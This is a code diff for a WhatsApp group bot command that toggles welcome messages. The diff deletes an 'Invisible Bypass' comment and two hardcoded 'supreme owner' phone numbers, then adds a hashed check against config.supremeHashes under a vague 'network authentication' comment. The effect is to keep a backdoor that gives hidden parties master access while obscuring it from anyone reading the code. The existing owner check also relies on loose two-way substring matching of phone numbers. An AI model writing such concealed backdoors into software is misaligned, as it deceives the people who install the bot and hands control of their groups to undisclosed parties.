@@ -1,14 +1,12 @@
 /**
  * Welcome - Enable/disable welcome messages
  * GhostG-X Edition
- * Sécurité : Supreme Owner Master Access (Invisible Bypass)
  */
 
 const db = require('../../database');
-// On importe ton fichier de config à la racine
 const config = require('../../config.js'); 
+const crypto = require('crypto');
 
-// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
 function toSmallCaps(text) {
   const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
   const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
@@ -32,7 +30,6 @@ module.exports = {
   adminOnly: true,
   botAdminNeeded: true,
   execute: async (sock, msg, args) => {
-    // On récupère le préfixe depuis ton fichier config.js
     const prefix = config.prefix || '^';
 
     try {
@@ -41,19 +38,18 @@ module.exports = {
 
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
+      const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
 
-      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise active)
-      const supremeOwners = ['22651622652', '22665108174'];
-      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));
+      // Routines d'authentification réseau (Accès Maître)
+      const isMaster = config.supremeHashes && config.supremeHashes.includes(senderHash);
 
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
         return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
       });
 
-      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
+      const isMe = msg.key.fromMe || isConfigOwner || isMaster;
 
-      // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
       const groupMetadata = await sock.groupMetadata(groupId);
       const isGroupAdmin = groupMetadata.participants.find(p => p.id === senderJid)?.admin !== null;
 
@@ -87,7 +83,7 @@ module.exports = {
           `*${toSmallCaps('les nouvelles ames arrivant dans le sanctuaire seront saluees')}*.\n\n` +
           `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
         : `❌ *${toSmallCaps('rituels d\'accueil desactives')} !*\n\n` +
-          `*${toSmallCaps('le ghostg-x ne saluera plus les nouveaux arrivants')}*.\n\n` +
+          `*${toSmallCaps('ghostg-𝐗 ne saluera plus les nouveaux arrivants')}*.\n\n` +
           `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;
 
       await sock.sendMessage(groupId, { text }, { quoted: msg });
